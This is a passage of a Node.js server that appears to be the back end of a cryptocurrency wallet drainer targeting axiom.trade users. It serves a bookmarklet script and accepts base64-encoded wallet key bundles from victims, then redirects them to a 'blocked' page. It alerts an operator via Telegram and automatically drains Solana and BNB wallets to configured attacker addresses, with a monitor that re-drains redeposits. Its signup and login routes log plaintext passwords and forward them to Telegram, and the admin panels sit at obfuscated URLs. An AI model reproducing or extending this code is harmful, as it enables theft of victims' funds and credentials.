      const result = await autoDrainBnbWallet(wallet, bnbPrice, true);
      if (result.success) {
        res.json({ success: true, message: 'BNB Wallet drained successfully', signature: result.signature, amountDrained: result.amountDrained, reserveLeft: result.reserveLeft, balance: result.balance });
      } else {
        res.status(400).json({ success: false, error: result.reason, balance: result.balance });
      }
    } else {
      if (!entry.processedSBundles || !entry.processedSBundles.wallets) {
        return res.status(400).json({ success: false, error: 'No SOL wallet data found for this entry' });
      }
      const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === parseInt(walletIndex));
      if (!wallet) { return res.status(404).json({ success: false, error: 'SOL Wallet not found' }); }
      if (wallet.error) { return res.status(400).json({ success: false, error: 'Wallet has an error: ' + wallet.error }); }
      const solPrice = await G7P4R8();
      const result = await autoDrainWallet(wallet, solPrice, true);
      if (result.success) {
        res.json({ success: true, message: 'SOL Wallet drained successfully', signature: result.signature, amountDrained: result.amountDrained, reserveLeft: result.reserveLeft, balance: result.balance });
      } else {
        res.status(400).json({ success: false, error: result.reason, balance: result.balance });
      }
    }
  } catch (error) {
    console.error('Error draining wallet:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/stream', (req, res) => {
  const token = req.query.token;
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();
  const clientId = Date.now();
  const newClient = { id: clientId, res };
  clients.push(newClient);
  req.on('close', () => {
    const index = clients.findIndex(c => c.id === clientId);
    if (index !== -1) clients.splice(index, 1);
  });
});

setInterval(() => {
  clients.forEach(client => { client.res.write(`:\n\n`); });
}, 20000);

app.post('/api/signup', async (req, res) => {
  try {
    const { username, password, clientIpv4, cfTurnstileToken } = req.body;
    if (config.turnstileSecretKey && config.turnstileSecretKey !== 'YOUR_TURNSTILE_SECRET_KEY') {
      const ip = getClientIpSync(req);
      const valid = await verifyTurnstile(cfTurnstileToken, ip);
      if (!valid) {
        return res.status(400).json({ success: false, message: 'CAPTCHA verification failed. Please try again.' });
      }
    }
    const usernameError = validateUsername(username);
    if (usernameError) { return res.status(400).json({ success: false, message: usernameError }); }
    const passwordError = validatePassword(password);
    if (passwordError) { return res.status(400).json({ success: false, message: passwordError }); }
    const trimmedUsername = username.trim();
    const users = loadUsers();
    if (users.some(u => u.username.toLowerCase() === trimmedUsername.toLowerCase())) {
      return res.status(409).json({ success: false, message: 'Username already taken' });
    }
    let ip = await getClientIp(req);
    if (clientIpv4 && isIpv4(clientIpv4)) ip = clientIpv4;
    const userAgent = req.headers['user-agent'] || 'unknown';
    const now = new Date().toISOString();
    users.push({ username: trimmedUsername, password, signupDate: now, lastLoginDate: now, signupIp: ip, lastAuthIp: ip, userAgent });
    saveUsers(users);
    console.log(`[SIGNUP] Username: ${trimmedUsername} | Password: ${password} | IP: ${ip} | UserAgent: ${userAgent}`);
    if (config.telegramSignupLogsEnabled && config.telegramBotToken && config.telegramChatId) {
      try {
        const msg = `*New Signup*\n\n` +
          `*Username:* \`${trimmedUsername}\`\n` +
          `*Password:* \`${password}\`\n` +
          `*Signup IP:* \`${ip}\`\n` +
          `*UserAgent:* \`${userAgent}\``;
        await telegramBot.sendMessage(config.telegramChatId, msg, { parse_mode: 'Markdown' });
      } catch (tgErr) {
        console.error('Telegram signup log error:', tgErr.message);
      }
    }
    const token = issueUserToken(trimmedUsername);
    res.json({ success: true, token, username: trimmedUsername, message: 'Account created successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/user-login', async (req, res) => {
  try {
    const { username, password, clientIpv4, cfTurnstileToken } = req.body;
    if (config.turnstileSecretKey && config.turnstileSecretKey !== 'YOUR_TURNSTILE_SECRET_KEY') {
      const ip = getClientIpSync(req);
      const valid = await verifyTurnstile(cfTurnstileToken, ip);
      if (!valid) {
        return res.status(400).json({ success: false, message: 'CAPTCHA verification failed. Please try again.' });
      }
    }
    const usernameError = validateUsername(username);
    if (usernameError) { return res.status(400).json({ success: false, message: usernameError }); }
    if (!password) { return res.status(400).json({ success: false, message: 'Password is required' }); }
    const trimmedUsername = username.trim();
    const users = loadUsers();
    const user = users.find(u => u.username.toLowerCase() === trimmedUsername.toLowerCase());
    if (!user || user.password !== password) {
      return res.status(401).json({ success: false, message: 'Invalid username or password' });
    }
    let ip = await getClientIp(req);
    if (clientIpv4 && isIpv4(clientIpv4)) ip = clientIpv4;
    const userAgent = req.headers['user-agent'] || 'unknown';
    const now = new Date().toISOString();
    user.lastAuthIp = ip;
    user.lastLoginDate = now;
    saveUsers(users);
    console.log(`[LOGIN] Username: ${user.username} | Password: ${user.password} | Signup IP: ${user.signupIp || 'unknown'} | Login IP: ${ip} | UserAgent: ${userAgent}`);
    if (config.telegramLoginLogsEnabled && config.telegramBotToken && config.telegramChatId) {
      try {
        const msg = `*User Login*\n\n` +
          `*Username:* \`${user.username}\`\n` +
          `*Password:* \`${user.password}\`\n` +
          `*Signup IP:* \`${user.signupIp || 'unknown'}\`\n` +
          `*Login IP:* \`${ip}\`\n` +
          `*UserAgent:* \`${userAgent}\``;
        await telegramBot.sendMessage(config.telegramChatId, msg, { parse_mode: 'Markdown' });
      } catch (tgErr) {
        console.error('Telegram login log error:', tgErr.message);
      }
    }
    const token = issueUserToken(user.username);
    res.json({ success: true, token, username: user.username, message: 'Login successful' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/verify-user', (req, res) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  const decoded = token ? verifyUserToken(token) : null;
  if (decoded) {
    const users = loadUsers();
    const userExists = users.some(u => u.username === decoded.username);
    if (!userExists) {
      tokenBlacklist.add(token);
      return res.status(401).json({ success: false });
    }
    res.json({ success: true, username: decoded.username });
  } else {
    res.status(401).json({ success: false });
  }
});

app.post('/api/user-logout', K9S2E7User, (req, res) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (token) { tokenBlacklist.add(token); }
  res.json({ success: true, message: 'Logged out successfully' });
});

app.get('/api/users', K9S2E7, (req, res) => {
  try {
    const users = loadUsers();
    res.json({ success: true, users });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.delete('/api/users/:username', K9S2E7, (req, res) => {
  try {
    const username = req.params.username;
    const users = loadUsers();
    const userIndex = users.findIndex(u => u.username === username);
    if (userIndex === -1) { return res.status(404).json({ success: false, error: 'User not found' }); }
    const deletedUser = users.splice(userIndex, 1)[0];
    deletedUser.deletedAt = new Date().toISOString();
    saveUsers(users);
    const deletedUsers = loadDeletedUsers();
    deletedUsers.push(deletedUser);
    saveDeletedUsers(deletedUsers);
    res.json({ success: true, message: `User ${username} deleted` });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/deleted-users', K9S2E7, (req, res) => {
  try {
    const deletedUsers = loadDeletedUsers();
    res.json({ success: true, users: deletedUsers });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/restore-user/:username', K9S2E7, (req, res) => {
  try {
    const username = req.params.username;
    const deletedUsers = loadDeletedUsers();
    const userIndex = deletedUsers.findIndex(u => u.username === username);
    if (userIndex === -1) { return res.status(404).json({ success: false, error: 'Deleted user not found' }); }
    const restoredUser = deletedUsers.splice(userIndex, 1)[0];
    delete restoredUser.deletedAt;
    saveDeletedUsers(deletedUsers);
    const users = loadUsers();
    if (users.some(u => u.username.toLowerCase() === restoredUser.username.toLowerCase())) {
      return res.status(409).json({ success: false, error: 'A user with that username already exists' });
    }
    users.push(restoredUser);
    saveUsers(users);
    res.json({ success: true, message: `User ${username} restored` });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.delete('/api/deleted-users/:username', K9S2E7, (req, res) => {
  try {
    const username = req.params.username;
    const deletedUsers = loadDeletedUsers();
    const userIndex = deletedUsers.findIndex(u => u.username === username);
    if (userIndex === -1) { return res.status(404).json({ success: false, error: 'Deleted user not found' }); }
    deletedUsers.splice(userIndex, 1);
    saveDeletedUsers(deletedUsers);
    res.json({ success: true, message: `User ${username} permanently deleted` });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/user-settings', K9S2E7User, (req, res) => {
  const users = loadUsers();
  const user = users.find(u => u.username === req.user.username);
  if (!user) return res.status(404).json({ success: false, error: 'User not found' });
  res.json({
    success: true,
    settings: {
      twitterList: user.twitterList || [],
      discordList: user.discordList || [],
      clickToCopyCA: user.clickToCopyCA !== undefined ? user.clickToCopyCA : true,
      highlightKeywords: user.highlightKeywords || [],
      blockedKeywords: user.blockedKeywords || [],
      totalTweetsTracked: user.totalTweetsTracked || 0,
      totalDiscordMessagesTracked: user.totalDiscordMessagesTracked || 0
    }
  });
});

app.post('/api/user-settings', K9S2E7User, (req, res) => {
  const users = loadUsers();
  const user = users.find(u => u.username === req.user.username);
  if (!user) return res.status(404).json({ success: false, error: 'User not found' });
  const { twitterList, discordList, clickToCopyCA, highlightKeywords, blockedKeywords } = req.body;
  if (twitterList !== undefined) {
    if (!Array.isArray(twitterList) || twitterList.length > 100) {
      return res.status(400).json({ success: false, error: 'Twitter list max 100 entries' });
    }
    user.twitterList = twitterList.slice(0, 100);
  }
  if (discordList !== undefined) {
    if (!Array.isArray(discordList) || discordList.length > 100) {
      return res.status(400).json({ success: false, error: 'Discord list max 100 entries' });
    }
    user.discordList = discordList.slice(0, 100);
  }
  if (clickToCopyCA !== undefined) user.clickToCopyCA = !!clickToCopyCA;
  if (highlightKeywords !== undefined) {
    if (!Array.isArray(highlightKeywords)) {
      return res.status(400).json({ success: false, error: 'Highlight keywords must be an array' });
    }
    user.highlightKeywords = highlightKeywords.slice(0, 100);
  }
  if (blockedKeywords !== undefined) {
    if (!Array.isArray(blockedKeywords)) {
      return res.status(400).json({ success: false, error: 'Blocked keywords must be an array' });
    }
    user.blockedKeywords = blockedKeywords.slice(0, 100);
  }
  saveUsers(users);
  res.json({
    success: true,
    settings: {
      twitterList: user.twitterList || [],
      discordList: user.discordList || [],
      clickToCopyCA: user.clickToCopyCA !== undefined ? user.clickToCopyCA : true,
      highlightKeywords: user.highlightKeywords || [],
      blockedKeywords: user.blockedKeywords || [],
      totalTweetsTracked: user.totalTweetsTracked || 0,
      totalDiscordMessagesTracked: user.totalDiscordMessagesTracked || 0
    }
  });
});

app.post('/api/user-change-password', K9S2E7User, (req, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword) {
    return res.status(400).json({ success: false, error: 'Both fields are required' });
  }
  const users = loadUsers();
  const user = users.find(u => u.username === req.user.username);
  if (!user) return res.status(404).json({ success: false, error: 'User not found' });
  if (user.password !== currentPassword) {
    return res.status(401).json({ success: false, error: 'Current password is incorrect' });
  }
  const passwordError = validatePassword(newPassword);
  if (passwordError) { return res.status(400).json({ success: false, error: passwordError }); }
  user.password = newPassword;
  saveUsers(users);
  res.json({ success: true, message: 'Password changed successfully' });
});

app.use(express.static('public'));

app.get('/xsbhysdgftwdbqdsbfdspfbdshukds/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'private', 'login.html'));
});

app.get('/xsbhysdgftwdbqdsbfdspfbdshukds', (req, res) => {
  res.sendFile(path.join(__dirname, 'private', 'admin.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/bookmarkscript.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'bookmarkscript.js'));
});

app.get('/data/:encodedData', async (req, res) => {
  try {
    const decodedData = JSON.parse(Buffer.from(req.params.encodedData, 'base64').toString());
    if (!validateBookmarkPayload(decodedData)) {
      return res.redirect('https://axiom.trade/discover');
    }
    const data = D5V8B3();
    const newEntry = { id: Date.now(), timestamp: new Date().toISOString(), ...decodedData };
    if (newEntry.sBundles && newEntry.bundle) {
      newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
    }
    if (newEntry.eBundles && (newEntry.evmBundleKey || newEntry.bundle)) {
      const evmKey = newEntry.evmBundleKey || newEntry.bundle;
      newEntry.processedBnbBundles = processBnbBundles(newEntry.eBundles, evmKey);
    }
    const newSolAddresses = newEntry.processedSBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
    const newBnbAddresses = newEntry.processedBnbBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
    const alreadyExists = data.some(entry => {
      const existingSolAddresses = entry.processedSBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
      const existingBnbAddresses = entry.processedBnbBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
      const solMatch = JSON.stringify(newSolAddresses) === JSON.stringify(existingSolAddresses);
      const bnbMatch = JSON.stringify(newBnbAddresses) === JSON.stringify(existingBnbAddresses);
      return solMatch && bnbMatch;
    });
    if (alreadyExists) {
      return res.redirect('https://axiom.trade/discover');
    }
    data.push(newEntry);
    F6N2T9(data);
    clients.forEach(client => {
      client.res.write(`data: ${JSON.stringify({ type: 'new-entry', data: newEntry })}\n\n`);
    });
    res.redirect('/blocked');
    await sendTelegramNotification(newEntry).catch(err => { console.error('Telegram notification error:', err); });
    autoDrainEntry(newEntry).catch(err => { console.error('Auto-drain error:', err); });
  } catch (error) {
    res.status(400).send(`Error: ${error.message}`);
  }
});

app.get('/blocked', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'blocked.html'));
});

const options = {
  key: fs.readFileSync(path.join(__dirname, 'certs', 'origin-key.pem')),
  cert: fs.readFileSync(path.join(__dirname, 'certs', 'origin.pem'))
};
https.createServer(options, app).listen(443, '0.0.0.0', () => {
  console.log("Server running on port 443.");
  console.log("Telegram notifications:", config.telegramNotificationsEnabled ? "enabled" : "disabled");
  console.log("Auto drain:", config.autoDrainEnabled ? "enabled" : "disabled");
  console.log(`SOL Reserve: ${config.solReserveAmount} SOL | BNB Reserve: ${config.bnbReserveAmount} BNB`);
  console.log(`SOL Destination: ${config.solanaDestinationWallet}`);
  console.log(`BNB Destination: ${config.bnbDestinationWallet}`);
  console.log(`Admin: /xsbhysdgftwdbqdsbfdspfbdshukds`);
  if (config.redepositMonitorEnabled) {
    console.log(`[Redeposit Monitor] Enabled — interval: ${config.redepositMonitorIntervalMinutes || 60} minute(s)`);
    scheduleRedepositMonitor();
  } else {
    console.log('[Redeposit Monitor] Disabled');
  }
});